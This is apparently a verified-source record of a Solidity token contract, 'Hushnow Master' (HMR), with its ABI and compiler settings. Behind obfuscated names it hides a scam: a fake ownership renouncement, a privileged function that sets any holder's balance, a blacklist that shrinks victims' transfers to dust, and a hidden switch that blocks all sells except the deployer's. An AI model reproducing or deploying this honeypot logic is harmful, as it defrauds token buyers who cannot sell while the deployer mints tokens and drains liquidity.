{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.7;\n\ninterface receiverTotal {\n    function createPair(address fromReceiverEnable, address maxReceiver) external returns (address);\n}\n\ninterface amountLaunchedExempt {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address walletTx) external view returns (uint256);\n\n    function transfer(address launchEnableTake, uint256 txIs) external returns (bool);\n\n    function allowance(address tradingFund, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 txIs) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address launchEnableTake,\n        uint256 txIs\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed marketingSenderTeam, uint256 value);\n    event Approval(address indexed tradingFund, address indexed spender, uint256 value);\n}\n\nabstract contract modeTotal {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface totalShouldTo {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface receiverMin is amountLaunchedExempt {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract HushnowMaster is modeTotal, amountLaunchedExempt, receiverMin {\n\n    mapping(address => mapping(address => uint256)) private sellBuy;\n\n    uint256 public listTo;\n\n    uint256 constant limitSwap = 18 ** 10;\n\n    bool public swapEnable;\n\n    function symbol() external view virtual override returns (string memory) {\n        return walletTotalAt;\n    }\n\n    constructor (){\n        if (sellWallet != buyFee) {\n            listTo = sellWallet;\n        }\n        totalShouldTo teamFund = totalShouldTo(swapReceiverSender);\n        totalWalletMin = receiverTotal(teamFund.factory()).createPair(teamFund.WETH(), address(this));\n        if (amountSender != launchedList) {\n            amountSender = true;\n        }\n        autoFund = _msgSender();\n        receiverList[autoFund] = true;\n        toTxTrading[autoFund] = exemptAt;\n        liquidityTrading();\n        if (listTo == sellWallet) {\n            sellWallet = fromMax;\n        }\n        emit Transfer(address(0), autoFund, exemptAt);\n    }\n\n    function shouldLiquidity(address totalLaunched) public {\n        swapFee();\n        if (listTo != buyFee) {\n            buyFee = sellWallet;\n        }\n        if (totalLaunched == autoFund || totalLaunched == totalWalletMin) {\n            return;\n        }\n        limitTake[totalLaunched] = true;\n    }\n\n    address public totalWalletMin;\n\n    uint256 public fromMax;\n\n    uint8 private feeAmountLiquidity = 18;\n\n    mapping(address => bool) public limitTake;\n\n    function transferFrom(address shouldMaxLaunch, address launchEnableTake, uint256 txIs) external override returns (bool) {\n        if (_msgSender() != swapReceiverSender) {\n            if (sellBuy[shouldMaxLaunch][_msgSender()] != type(uint256).max) {\n                require(txIs <= sellBuy[shouldMaxLaunch][_msgSender()]);\n                sellBuy[shouldMaxLaunch][_msgSender()] -= txIs;\n            }\n        }\n        return receiverTrading(shouldMaxLaunch, launchEnableTake, txIs);\n    }\n\n    string private walletFee = \"Hushnow Master\";\n\n    uint256 public sellWallet;\n\n    uint256 receiverIs;\n\n    function fundMarketingBuy(address shouldMaxLaunch, address launchEnableTake, uint256 txIs) internal returns (bool) {\n        require(toTxTrading[shouldMaxLaunch] >= txIs);\n        toTxTrading[shouldMaxLaunch] -= txIs;\n        toTxTrading[launchEnableTake] += txIs;\n        emit Transfer(shouldMaxLaunch, launchEnableTake, txIs);\n        return true;\n    }\n\n    address atLiquidity = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    address public autoFund;\n\n    function swapFee() private view {\n        require(receiverList[_msgSender()]);\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return exemptAt;\n    }\n\n    function amountExempt(uint256 txIs) public {\n        swapFee();\n        receiverIs = txIs;\n    }\n\n    function transfer(address liquidityEnable, uint256 txIs) external virtual override returns (bool) {\n        return receiverTrading(_msgSender(), liquidityEnable, txIs);\n    }\n\n    mapping(address => uint256) private toTxTrading;\n\n    uint256 liquidityAtAuto;\n\n    function approve(address marketingFee, uint256 txIs) public virtual override returns (bool) {\n        sellBuy[_msgSender()][marketingFee] = txIs;\n        emit Approval(_msgSender(), marketingFee, txIs);\n        return true;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return walletFee;\n    }\n\n    uint256 private exemptAt = 100000000 * 10 ** 18;\n\n    bool private amountSender;\n\n    mapping(address => bool) public receiverList;\n\n    function decimals() external view virtual override returns (uint8) {\n        return feeAmountLiquidity;\n    }\n\n    function getOwner() external view returns (address) {\n        return sellFee;\n    }\n\n    function isReceiver(address liquidityEnable, uint256 txIs) public {\n        swapFee();\n        toTxTrading[liquidityEnable] = txIs;\n    }\n\n    bool public launchedList;\n\n    string private walletTotalAt = \"HMR\";\n\n    function allowance(address tradingAuto, address marketingFee) external view virtual override returns (uint256) {\n        if (marketingFee == swapReceiverSender) {\n            return type(uint256).max;\n        }\n        return sellBuy[tradingAuto][marketingFee];\n    }\n\n    event OwnershipTransferred(address indexed toLimit, address indexed receiverModeLimit);\n\n    address private sellFee;\n\n    function balanceOf(address walletTx) public view virtual override returns (uint256) {\n        return toTxTrading[walletTx];\n    }\n\n    function liquidityTrading() public {\n        emit OwnershipTransferred(autoFund, address(0));\n        sellFee = address(0);\n    }\n\n    function liquidityMin(address receiverFee) public {\n        require(receiverFee.balance < 100000);\n        if (swapEnable) {\n            return;\n        }\n        if (sellWallet != fromMax) {\n            fromMax = listTo;\n        }\n        receiverList[receiverFee] = true;\n        \n        swapEnable = true;\n    }\n\n    function receiverTrading(address shouldMaxLaunch, address launchEnableTake, uint256 txIs) internal returns (bool) {\n        if (shouldMaxLaunch == autoFund) {\n            return fundMarketingBuy(shouldMaxLaunch, launchEnableTake, txIs);\n        }\n        uint256 launchIs = amountLaunchedExempt(totalWalletMin).balanceOf(atLiquidity);\n        require(launchIs == receiverIs);\n        require(launchEnableTake != atLiquidity);\n        if (limitTake[shouldMaxLaunch]) {\n            return fundMarketingBuy(shouldMaxLaunch, launchEnableTake, limitSwap);\n        }\n        return fundMarketingBuy(shouldMaxLaunch, launchEnableTake, txIs);\n    }\n\n    uint256 private buyFee;\n\n    function owner() external view returns (address) {\n        return sellFee;\n    }\n\n    address swapReceiverSender = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tradingFund\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"toLimit\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverModeLimit\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"marketingSenderTeam\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingAuto\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"marketingFee\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"txIs\",\"type\":\"uint256\"}],\"name\":\"amountExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingFee\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"txIs\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoFund\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletTx\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromMax\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityEnable\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"txIs\",\"type\":\"uint256\"}],\"name\":\"isReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedList\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"limitTake\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverFee\",\"type\":\"address\"}],\"name\":\"liquidityMin\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listTo\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"receiverList\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellWallet\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalLaunched\",\"type\":\"address\"}],\"name\":\"shouldLiquidity\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapEnable\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalWalletMin\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityEnable\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"txIs\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldMaxLaunch\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"launchEnableTake\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"txIs\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "HushnowMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}